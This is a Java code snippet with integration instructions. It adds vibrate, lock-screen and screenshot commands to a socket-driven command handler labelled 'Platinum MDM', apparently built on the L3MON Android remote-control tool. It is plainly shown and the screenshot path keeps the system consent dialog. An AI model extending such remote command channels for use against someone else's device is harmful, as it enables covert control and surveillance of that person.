/**
 * ═══════════════════════════════════════════════════════════════════
 *  ConnectionManager.java — Platinum MDM Command Handler Additions
 * ═══════════════════════════════════════════════════════════════════
 *
 * INSTRUCTIONS:
 * In your existing ConnectionManager.java, locate the 'switch (order)' block
 * (or the if-else chain) inside the socket "order" event listener.
 *
 * ADD these cases to that switch block:
 *
 *   case "0xVB":
 *       VibrationHandler();
 *       break;
 *
 *   case "0xLK":
 *       LockDeviceHandler();
 *       break;
 *
 *   case "0xSC":
 *       ScreenshotHandler();
 *       break;
 *
 * Then ADD the following methods to the ConnectionManager class:
 */

// ─── Vibration Handler ────────────────────────────────────────────────────────
private static void VibrationHandler() {
    // Default: vibrate for 1 second
    MDMActionHandler.vibrate(MainService.getContextOfApplication(), 1000);
}

// ─── Lock Screen Handler ──────────────────────────────────────────────────────
private static void LockDeviceHandler() {
    MDMActionHandler.lockScreen(MainService.getContextOfApplication());
}

// ─── Screenshot Handler ────────────────────────────────────────────────────────
// NOTE: Screenshots REQUIRE an Activity context (MainActivity) since they need
// startActivityForResult for the system consent dialog.
// The preferred flow is: ConnectionManager sends a broadcast to MainActivity,
// MainActivity launches the MediaProjection consent dialog, then forwards the
// result to ScreenCaptureService.

private static void ScreenshotHandler() {
    // Send a local broadcast to MainActivity to trigger the MediaProjection dialog
    Context context = MainService.getContextOfApplication();
    Intent intent = new Intent("com.etechd.l3mon.ACTION_SCREENSHOT");
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.sendBroadcast(intent);
}

/**
 * ─── In MainActivity.java – Add these additions ──────────────────────────────
 *
 * 1. Register a BroadcastReceiver in onCreate():
 *
 *   BroadcastReceiver screenshotReceiver = new BroadcastReceiver() {
 *       @Override
 *       public void onReceive(Context context, Intent intent) {
 *           if ("com.etechd.l3mon.ACTION_SCREENSHOT".equals(intent.getAction())) {
 *               MDMActionHandler.requestScreenCapture(MainActivity.this);
 *           }
 *       }
 *   };
 *   registerReceiver(screenshotReceiver, new IntentFilter("com.etechd.l3mon.ACTION_SCREENSHOT"));
 *
 * 2. Override onActivityResult():
 *
 *   @Override
 *   protected void onActivityResult(int requestCode, int resultCode, Intent data) {
 *       super.onActivityResult(requestCode, resultCode, data);
 *       if (requestCode == 1001 && resultCode == RESULT_OK) {
 *           MDMActionHandler.startScreenCaptureService(this, data);
 *       }
 *   }
 */
